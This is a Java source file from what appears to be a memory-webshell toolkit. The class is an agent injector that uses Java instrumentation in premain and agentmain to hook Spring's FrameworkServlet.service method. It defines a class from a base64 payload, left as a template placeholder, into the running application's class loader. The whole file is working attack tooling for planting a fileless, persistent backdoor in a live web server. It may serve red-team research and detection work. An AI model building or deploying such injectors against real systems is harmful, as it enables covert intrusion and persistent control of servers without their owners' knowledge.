package com.reajason.javaweb.memshell.injector.springwebmvc;

import com.reajason.javaweb.agent.AgentInjectorSupport;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;

/**
 * @author ReaJason
 * @since 2025/3/26
 */
public class SpringWebMvcFrameworkServletAgentInjector {
    private static final AgentInjectorSupport.Config CONFIG = AgentInjectorSupport.Config
            .of("org/springframework/web/servlet/FrameworkServlet", "service")
            .defineIntoLoader();
    private static volatile ClassFileTransformer transformer;

    public static String getClassName() {
        return "{{advisorName}}";
    }

    public static String getBase64String() {
        return "{{base64String}}";
    }

    public static void premain(String args, Instrumentation inst) throws Exception {
        transformer = AgentInjectorSupport.launchTransient(inst, transformer, CONFIG, getClassName(), getBase64String());
    }

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        premain(args, inst);
    }
}
